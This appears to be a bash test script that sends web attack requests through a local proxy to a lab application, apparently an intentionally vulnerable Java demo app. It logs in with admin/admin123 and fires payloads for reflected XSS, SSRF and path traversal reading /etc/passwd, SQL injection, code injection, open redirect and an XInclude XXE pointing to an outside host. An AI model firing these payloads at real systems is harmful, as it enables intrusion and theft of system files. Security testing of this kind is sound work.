#!/bin/bash

PS=127.0.0.1
IP=192.168.1.37

# brute-force
d=`curl -i -x "http://${PS}:10802" http://${IP}:8001/login --data 'username=admin&password=admin123'| grep -Fi Set-Cookie | awk '{print $2}'`
$(> temp)
for POD1 in ${d}
do
  echo ${POD1} | cut -d ';' -f 1 >> temp
done

COOKIE=$(cat ./temp | tr '\n' ';')

# xss
curl -x "http://${PS}:10802" "http://${IP}:8001/xss/reflect?xss=%3Cscript%3Ealert(1)%3C/script%3E" -H "Cookie: $COOKIE" \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'Accept-Language: zh-CN,zh;q=0.9' \
  -H 'Cache-Control: no-cache' \
  -H 'Pragma: no-cache' \
  -H 'Proxy-Connection: keep-alive' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36' \
  --compressed \
  --insecure

# xss
curl -x "http://${PS}:10802" "http://${IP}:8001/ssrf/urlConnection/vuln?url=file:///etc/passwd" -H "Cookie: $COOKIE" \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'Accept-Language: zh-CN,zh;q=0.9' \
  -H 'Cache-Control: no-cache' \
  -H 'Pragma: no-cache' \
  -H 'Proxy-Connection: keep-alive' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36' \
  --compressed \
  --insecure

# cmd-injection
curl -x "http://${PS}:10802" "http://${IP}:8001/codeinject?filepath=1" -H "Cookie: $COOKIE"

# sqldet
curl -x "http://${PS}:10802" "http://${IP}:8001/sqli/mybatis/vuln01?username=joychou%27%20or%20%271%27=%271" -H "Cookie: $COOKIE"

# redirect
curl -x "http://${PS}:10802" "http://${IP}:8001/urlRedirect/redirect?url=http://www.baidu.com" -H "Cookie: $COOKIE"

# xxe no
curl -X POST -x "http://${PS}:10802" "http://${IP}:8001/xxe/Digester/vuln" -H "Content-Type: application/xml" -H "Cookie: $COOKIE" --data '<?xml version='\''1.0'\''?>
<data xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://publicServer.com/file.xml"></xi:include></data>'

# path_traversal no
curl -x "http://${PS}:10802" "http://${IP}:8001/path_traversal/vul?filepath=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd" -H "Cookie: $COOKIE"
